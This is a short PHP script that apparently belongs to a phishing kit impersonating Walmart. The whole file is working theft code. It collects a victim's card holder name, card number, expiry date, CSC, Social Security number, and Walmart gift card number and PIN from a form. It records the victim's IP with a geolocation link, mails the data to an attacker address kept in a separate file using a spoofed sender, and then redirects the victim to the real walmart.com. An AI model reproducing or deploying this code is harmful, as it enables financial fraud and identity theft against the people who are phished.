<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "==========[BY Meed Smith]=========<br>\n";
$message .= "Card Holder		 : ".$_POST['1']."<br>\n";
$message .= "Card Number         : ".$_POST['2']."<br>\n";
$message .= "Expire Date		 : ".$_POST['3']."<br>\n";
$message .= "CSC		         : ".$_POST['4']."<br>\n";
$message .= "SSN		         : ".$_POST['5']."<br>\n";
$message .= "==========[Walmart Card]=========<br>\n";
$message .= "Gift Card Nickname	 : ".$_POST['6']."<br>\n";
$message .= "Gift Card Number    : ".$_POST['7']."<br>\n";
$message .= "PIN		         : ".$_POST['8']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY Meed Smith]=========<br>";

include '../e-mail.php';
$subject = "> Walmart Credit Card & Gift - [$ip]";
$headers = "From: ~Meed-Smith~ <The.GrXn0v@support.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($to, $subject, $message,$headers);
header("Location: https://www.walmart.com/");

?>
